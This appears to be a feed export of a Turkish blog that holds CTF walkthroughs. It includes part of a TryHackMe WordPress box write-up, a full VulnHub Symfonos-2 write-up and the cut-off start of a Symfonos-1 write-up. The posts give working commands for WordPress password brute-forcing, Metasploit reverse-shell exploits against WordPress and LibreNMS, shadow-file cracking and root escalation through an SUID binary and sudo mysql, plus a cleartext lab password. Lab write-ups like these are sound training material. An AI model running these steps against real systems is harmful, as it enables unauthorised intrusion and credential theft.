 |  - http://blog.thm/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;
 |  - http://blog.thm/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
</code></pre><p>Wordpress sÃ¼rÃ¼mÃ¼ ile ilgili exploit araÅŸtÄ±rmasÄ± yapÄ±ldÄ±ÄŸÄ±nda dÃ¼ÅŸÃ¼k kullanÄ±cÄ± ile shell upload edilebilcek bir zafiyet tespit edilmektedir.</p>

    <img src="/images/thm/blog/exp.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Exploitin kullanÄ±mÄ± iÃ§in kullanÄ±cÄ± hesap bilgilerine ihtiyaÃ§ vardÄ±r. Wpscan aracÄ± ile elde edilen hesaplara brute force saldÄ±rÄ±sÄ± dÃ¼zenlenir. Ä°ÅŸlem soncunda kwhell adlÄ± kullanÄ±cÄ±ya ait parola elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://blog.thm -U user.lst -P /usr/share/wordlists/rockyou.txt
</code></pre></div>
    <img src="/images/thm/blog/pass.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Metasploit aracÄ± aÃ§Ä±lÄ±r ve tespit edilen exploit modulÃ¼ aranÄ±r. SeÃ§ilen modÃ¼le ait ayarlar options komutu gÃ¶rÃ¼ntÃ¼lenir.</p>
<p><em>Not: Metasploit 6 sÃ¼rÃ¼mÃ¼nde exploit iÅŸleminden sonra shell almada sÄ±kÄ±ntÄ±lar olmaktadÄ±r.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">msf5 &gt; search crop-image

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


msf5 &gt; use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(multi/http/wp_crop_rce) &gt; options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

</code></pre></div><p>Exploitin kullanÄ±mÄ± iÃ§in zorunlu parametlere set edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&gt; set password *********
&gt; set username kwheel
&gt; set rhosts 10.10.25.92
&gt; set lhost 10.9.62.67
</code></pre></div><h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Run/Exploit komutu ile meterpreter oturumu elde edilmiÅŸ olur.</p>
<p><em>/home/bjoel</em> dizin iÃ§eriÄŸi kontrol edildiÄŸinde user.txt dosyasÄ± gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/thm/blog/home.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Ä°Ã§erik gÃ¶rÃ¼ntÃ¼lendiÄŸinde tam bir hayal kÄ±rÄ±lÄ±ÄŸÄ±dÄ±r. ğŸ˜­</p>

    <img src="/images/thm/blog/fake.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><code>shell</code> komutu ile meterpreter oturumdan normal terminal oturumuna geÃ§ilir. Sistem genelinde user.txt aramasÄ± yapÄ±ldÄ±ÄŸÄ±nda baÅŸka dosya bulunamaz. User.txt dosyasÄ± yÃ¼ksek kullanÄ±cÄ± eriÅŸimine sahip bir dizin iÃ§erisinde yer almaktadÄ±r.</p>
<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Yetki yÃ¼kseltmek iÃ§in suid biti aktif dosyalar tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</code></pre></div>
    <img src="/images/thm/blog/suid.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/usr/sbin/checker</strong></em> uygulamasÄ± dikkat Ã§ekmektedir. Uygulama Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda <mark>Not an Admin </mark> hatasÄ± vermektedir. UygulamanÄ±n iÅŸleyiÅŸinin daha iyi anlaÅŸÄ±labilmesi iÃ§in uygulama home dizinine kopyalanÄ±r ve tersine mÃ¼hendislik araÃ§larÄ± ile incelenmek Ã¼zere locale indirilir.</p>
<blockquote>
<p>Not: Home dizininde <code>python2 -m SimpleHTTPServer 8000</code> komutu Ã§alÄ±ÅŸtÄ±lÄ±r. Ä°ster tarayÄ±cÄ±dan ister curl, wget gibi araÃ§larla dosya indirilebilir.</p>
</blockquote>
<p>Ghridra ile binary analiz edilir. <em><strong>getenv(&ldquo;parametre&rdquo;)</strong></em> fonksiyonu parametre aldÄ±ÄŸÄ± deÄŸeri ortam deÄŸiÅŸkenleri iÃ§erisinde arar varsa deÄŸerini dÃ¶ndÃ¼rÃ¼r. <em>Admin deÄŸiÅŸkeni varsa uid deÄŸeri 0 (root) olarak set edilir ve /bin/bash baÅŸlatÄ±lÄ±r.</em></p>

    <img src="/images/thm/blog/ghidra.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Burada <em>admin</em> deÄŸeri ortam deÄŸiÅŸkeninleri iÃ§erisinde aranmaktadÄ±r. Bypass iÃ§in <code>export</code> komutu ile admin deÄŸiÅŸkeni tanÄ±mlanÄ±r ve rastgele bir deÄŸer atanÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export admin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>
</code></pre></div><p><em>/usr/sbin/checker</em> uygulamasÄ± Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda root yetkisi ile shell oturumu elde edilir.</p>
<pre><code class="language-terminal" data-lang="terminal">/usr/sbin/checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
</code></pre><p>Root dizini altÄ±nda yer alan root.txt okunur.</p>

    <img src="/images/thm/blog/root.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>User.txt iÃ§in <code>find</code> komutu ile arama yapÄ±ldÄ±ÄŸÄ±nda /media/usb/ dizini altÄ±nda bulunur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find -name <span style="color:#e6db74">&#39;user.txt&#39;</span> 2&gt;/dev/null
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">/home/bjoel/user.txt
/media/usb/user.txt
</code></pre>
    <img src="/images/thm/blog/user.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB Symfonos-2 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-2-write-up/</link>
            <pubDate>Tue, 06 Oct 2020 11:25:38 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-2-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere VULNHUB &amp;lsquo;da yer alan Symfonos serisinin OSCP tadÄ±nda olan 2. makinasÄ±nÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip;
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
netdiscover -i eth1  Her zaman olduÄŸu gibi nmap ile tÃ¼m portlar ve aÃ§Ä±k olan portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/symfonos-2,331/">VULNHUB</a> &lsquo;da yer alan Symfonos serisinin OSCP tadÄ±nda olan 2. makinasÄ±nÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip;</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/symfonos2/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Her zaman olduÄŸu gibi nmap ile tÃ¼m portlar ve aÃ§Ä±k olan portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.115
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 06:48 CDT
Nmap scan report for 192.168.56.115 (192.168.56.115)
Host is up (0.00012s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:FD:79:D9 (Oracle VirtualBox virtual NIC)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h39m59s, deviation: 2h53m12s, median: 2h59m59s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2020-10-05T09:48:38-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-05T14:48:38
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
</code></pre><p>Ä°lk gÃ¶ze Ã§arpan 139 ve 445 numaralÄ± portlarda Ã§alÄ±ÅŸan Samba ve 21 numaralÄ± portta Ã§alÄ±ÅŸan ftp servisidir.</p>
<p>Samba servisinde paylaÅŸÄ±ma aÃ§Ä±k olan dosya ve klasÃ¶rler <em>smbclient</em> ile kontrol edilir. PaylaÅŸÄ±ma aÃ§Ä±k olan dizin iÃ§eriÄŸi kontrol edilir. log.txt dosyasÄ± indirilir ve incelenir.</p>
<pre><code class="language-terminal" data-lang="terminal">smbclient  -L //192.168.56.115/
smbclient  //192.168.56.114/anonymous
</code></pre>
    <img src="/images/vulnhub/symfonos2/smb.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Log.txt dosyasÄ±nda 2 adet Ã¶nemli bilgi yer almaktadÄ±r.</p>
<ol>
<li>shadow dosyasÄ±nÄ±n yedeklendiÄŸi dizin</li>
</ol>

    <img src="/images/vulnhub/symfonos2/info1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<ol start="2">
<li>Samba ile paylaÅŸÄ±ma aÃ§Ä±lan dizin yolu</li>
</ol>

    <img src="/images/vulnhub/symfonos2/info2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>ProFTPD 1.3.5 sÃ¼rÃ¼mÃ¼nde <em>CVE:2015-3306</em> kodu ile login olmadan dosya kopyalama zafiyeti bulunmaktadÄ±r.</p>

    <img src="/images/vulnhub/symfonos2/ftpexp.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>ftp portuna baÄŸlanÄ±rlÄ±r. Shadow.bak ve passwd dosyalarÄ± ÅŸifresiz eriÅŸime aÃ§Ä±k olan backups klasÃ¶rÃ¼ne kopyalanÄ±r. Samba servisinden dosyalar indirilerek hesap ÅŸifreleri sÃ¶zlÃ¼k saldÄ±rÄ±sÄ± yapÄ±larak elde edilir.</p>
<p><em>Not: Shell almak iÃ§in web dizinine dosya upload edilemeye Ã§alÄ±ÅŸÄ±ldÄ±ÄŸÄ±nda hata ile karÅŸÄ±laÅŸÄ±lmÄ±ÅŸtÄ±r. Web dizini root yetkisindedir.</em></p>

    <img src="/images/vulnhub/symfonos2/ftp.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Unshadow aracÄ± ile elde edilen hesap bilgileri sÃ¶zlÃ¼k saldÄ±rÄ±sÄ± iÃ§in uygun formata getirilir.<em>(shadow.bak -&gt; pass olarak kayÄ±t edilmiÅŸtir.)</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">unshadow passwd.bak pass &gt; crack
</code></pre></div><p>John ile sÃ¶zlÃ¼k saldÄ±rÄ±sÄ± yapÄ±lÄ±r. <strong>aeolus</strong> kullancÄ±sÄ±nÄ±n hesap parolasÄ± elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt crack 
</code></pre></div>
    <img src="/images/vulnhub/symfonos2/hydra.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Aeolus kullanÄ±cÄ±sÄ± bilgileri ile ssh baÄŸlantÄ±sÄ± yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh aeolus@192.168.56.115
</code></pre></div>
    <img src="/images/vulnhub/symfonos2/ssh.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>LinEnum betiÄŸi ile sistem hakkÄ±nda bilgi toplanÄ±r. Network baÄŸlantÄ±larÄ± dikkatli incelendiÄŸinde 3306, 8080 ve 25 numaralÄ± portlar localde Ã§alÄ±ÅŸan uygulamalara ait aÃ§Ä±k portlardÄ±r. 25. portta Exim mail servisi, 3306 portta mysql servisi ve 8080 portunda Apache web servisi Ã§alÄ±ÅŸmaktadÄ±r.</p>
<p>Portlar dÄ±ÅŸarÄ±ya aÃ§Ä±k olmadÄ±ÄŸÄ±ndan portlara eriÅŸim <strong>ssh tÃ¼neli</strong> ile saÄŸlanmalÄ±dÄ±r. Bu kapsamda shh ile port yÃ¶nlendirme yapÄ±lÄ±r. Kendi bilgisayarÄ±mÄ±zda 8080 portu ssh ile baÄŸlanÄ±lÄ±lan makinada 8080 portuna yÃ¶nlendirilmiÅŸtir.</p>

    <img src="/images/vulnhub/symfonos2/network.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh  -L  8080:localhost:8080 aeolus@192.168.56.115
</code></pre></div><p>BaÄŸlantÄ±dan sonra tarayÄ±cÄ±ndan <em>localhost:8080</em> adresine istek atÄ±larak Ã§alÄ±ÅŸan apache servisine baÄŸlanÄ±lÄ±r. LibreNMS adÄ±nda aÄŸ izleme aracÄ± Ã§alÄ±ÅŸmaktadÄ±r. aeolus kullanÄ±cÄ±sÄ±na ait bilgiler ile giriÅŸ yapÄ±lÄ±r.</p>

    <img src="/images/vulnhub/symfonos2/libre.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Metasploit aracÄ± iÃ§erisinde yazÄ±lÄ±ma ait 2 adet exploit bulunmaktadÄ±r.</p>
<pre><code class="language-terminal" data-lang="terminal">msf6 &gt; search librenms

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/linux/http/librenms_addhost_cmd_inject   2018-12-16       excellent  No     LibreNMS addhost Command Injection
   1  exploit/linux/http/librenms_collectd_cmd_inject  2019-07-15       excellent  Yes    LibreNMS Collectd Command Injection

</code></pre><p>Ä°lk sÄ±radaki exploit seÃ§ilir. Ayarlara bakÄ±lÄ±r.</p>
<pre><code class="language-terminal" data-lang="terminal">msf6 &gt; use 0
[*] Using configured payload cmd/unix/reverse
msf6 exploit(linux/http/librenms_addhost_cmd_inject) &gt; options

Module options (exploit/linux/http/librenms_addhost_cmd_inject):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password for LibreNMS
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base LibreNMS path
   USERNAME                    yes       User name for LibreNMS
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux
</code></pre><p>Gerekli parametreler girilerek exploit Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.</p>
<pre><code class="language-terminal" data-lang="terminal"> &gt; set username aeolus
 &gt; set rhosts 127.0.0.1
 &gt; set rport 8080
 &gt; set password sergioteamo
 &gt; set lhost 192.168.56.105
</code></pre><p>Exploit Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda Cronus adlÄ± kullanÄ±cÄ± ile terminal baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>
<p><em>Not: LinEnum ile yapÄ±lan keÅŸifte de 8080 portunda Ã§alÄ±ÅŸan Apache servisi Cronus kullanÄ±cÄ±sÄ± yetkisi ile Ã§alÄ±ÅŸmaktadÄ±r.</em></p>
<pre><code class="language-terminal" data-lang="terminal">msf6 exploit(linux/http/librenms_addhost_cmd_inject) &gt; run

[*] Started reverse TCP double handler on 192.168.56.105:4444 
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname LLOYBQ
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Successfully deleted device with hostname LLOYBQ and id #1
[*] Command: echo 4bqnipl207sgGUKw;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: &quot;4bqnipl207sgGUKw\r\n&quot;
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.56.105:4444 -&gt; 192.168.56.115:57248) at 2020-10-05 14:39:26 -0500


id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
</code></pre><p>Sistem hakkÄ±nda cronus kullanÄ±cÄ±sÄ± yetkileri ile tekrar bilgi toplamak iÃ§in LinEnum betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±labilir. Ben genelde sistemde ilk olarak sudo yetkilerini kontrol ederim. Kontrol sonucunda mysql uygulamasÄ±nÄ±n root yetkisi ile Ã§alÄ±ÅŸtÄ±rÄ±labildiÄŸi gÃ¶rÃ¼lmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> cronus on symfonos2:
    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin

User cronus may run the following commands on symfonos2:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/mysql
</code></pre></div><p><code>sudo mysql -e '\! /bin/sh'</code> komutu kullanÄ±larak root yetkisi ile terminal baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
ls -lsa /root
total <span style="color:#ae81ff">28</span>
<span style="color:#ae81ff">4</span> drwx------  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> .
<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">22</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> ..
<span style="color:#ae81ff">0</span> lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> .bash_history -&gt; /dev/null
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">570</span> Jan <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2010</span> .bashrc
<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> .config
<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> .local
<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">148</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2015</span> .profile
<span style="color:#ae81ff">4</span> -rw-------  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1444</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> proof.txt
bash -i
bash: cannot set terminal process group <span style="color:#f92672">(</span>514<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
root@symfonos2:/opt/librenms/html#
</code></pre></div><p>Proof.txt dosyasÄ± okunarak makina Ã§Ã¶zÃ¼mleme iÅŸlemi tamalanÄ±r.</p>

    <img src="/images/vulnhub/symfonos2/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB Symfonos-1 Write up</title>
            <link>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-1-write-up/</link>
            <pubDate>Sun, 04 Oct 2020 18:13:49 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/vulnhub-symfonos-1-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere VULNHUB &amp;lsquo;da yer alan Symfonos-1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip; ğŸ˜Š
Ä°lk olarak tasarÄ±mcÄ± tarafÄ±ndan belirtilen alan adÄ± /etc/hosts dosyasÄ±na ip adresi symfonos.local ÅŸeklinde eklenir.
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
netdiscover -i eth1  Her zaman olduÄŸu gibi nmap ile tÃ¼m portlar ve aÃ§Ä±k olan portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/symfonos-1,322/">VULNHUB</a> &lsquo;da yer alan Symfonos-1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip; ğŸ˜Š</p>
<p>Ä°lk olarak tasarÄ±mcÄ± tarafÄ±ndan belirtilen alan adÄ± <em>/etc/hosts</em> dosyasÄ±na <code>ip adresi  symfonos.local</code> ÅŸeklinde eklenir.</p>

    <img src="/images/vulnhub/symfonos1/desc.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/symfonos1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Her zaman olduÄŸu gibi nmap ile tÃ¼m portlar ve aÃ§Ä±k olan portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.114
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 07:36 CDT
Nmap scan report for 192.168.56.114 (192.168.56.114)
Host is up (0.00011s latency).
